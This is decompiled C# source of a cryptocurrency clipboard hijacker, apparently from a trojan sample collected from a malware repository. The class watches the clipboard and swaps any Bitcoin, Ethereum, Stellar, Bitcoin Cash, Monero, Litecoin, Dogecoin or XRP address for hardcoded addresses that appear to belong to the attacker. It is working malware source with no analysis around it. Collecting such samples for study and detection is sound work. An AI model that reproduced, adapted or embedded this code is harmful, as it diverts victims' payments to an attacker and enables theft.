// Decompiled with JetBrains decompiler
// Type: Update.ClipboardNotification
// Assembly: clipper, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 242A9602-A994-4229-B0B4-C06434ACB202
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-b5d991bf67c08940cb29c672a23da53844f43986851cbe189bb6b21c2c0e9f41.exe

using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Update
{
  public sealed class ClipboardNotification
  {
    public class NotificationForm : Form
    {
      private static string currentClipboard = Clipboard.GetText();

      public NotificationForm()
      {
        NativeMethods.SetParent(this.Handle, NativeMethods.HWND_MESSAGE);
        NativeMethods.AddClipboardFormatListener(this.Handle);
      }

      private bool RegexResult(Regex pattern) => pattern.Match(ClipboardNotification.NotificationForm.currentClipboard).Success;

      protected override void WndProc(ref Message m)
      {
        if (m.Msg == 797)
        {
          ClipboardNotification.NotificationForm.currentClipboard = Clipboard.GetText();
          string replacement1 = "bc1q9z4p34q736vk9yc6h76fte33wz9c058eehxu9u";
          string replacement2 = "0xC1e3B26f2b9b6D9ecABa30B53eeab19d22eDF82C";
          string replacement3 = "GCSP7EFTXVM4YS5D64ZAFOJUVAQRRDEWDR44PYS62J5KDCHFSXNMDAYZ";
          string replacement4 = "qpz2adnmqj4fjdkrmk08qwf8prr3ur2jecg9rd7yw7";
          string replacement5 = "47YSkuoNATjYF3p3XerUfsJzirEiVqDYKY5hkvYQGuZ6aEekkt72qztDHY3JH1A5RS8Auxtp9jfMnSgPfQhuM5VdVSBABvQ";
          string replacement6 = "LNu2FxiZe8sboJDtMEmEjJayUNqyFf9Bpa";
          string replacement7 = "DLiEgyBWjNJJRGa6BtF7QHtTTenc6b1zhx";
          string replacement8 = "rLGFQyev3rcVCG6e9GDXxrBaem2TotaGAE";
          if (this.RegexResult(PatternRegex.btc) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement1))
            Clipboard.SetText(PatternRegex.btc.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement1));
          if (this.RegexResult(PatternRegex.ethereum) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement2))
            Clipboard.SetText(PatternRegex.ethereum.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement2));
          if (this.RegexResult(PatternRegex.xlm) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement3))
            Clipboard.SetText(PatternRegex.xlm.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement3));
          if (this.RegexResult(PatternRegex.bch) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement4))
            Clipboard.SetText(PatternRegex.bch.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement4));
          if (this.RegexResult(PatternRegex.xmr) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement5))
            Clipboard.SetText(PatternRegex.xmr.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement5));
          if (this.RegexResult(PatternRegex.ltc) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement6))
            Clipboard.SetText(PatternRegex.ltc.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement6));
          if (this.RegexResult(PatternRegex.doge) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement7))
            Clipboard.SetText(PatternRegex.doge.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement7));
          if (this.RegexResult(PatternRegex.xrp) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(replacement8))
            Clipboard.SetText(PatternRegex.xrp.Replace(ClipboardNotification.NotificationForm.currentClipboard, replacement8));
        }
        base.WndProc(ref m);
      }
    }
  }
}
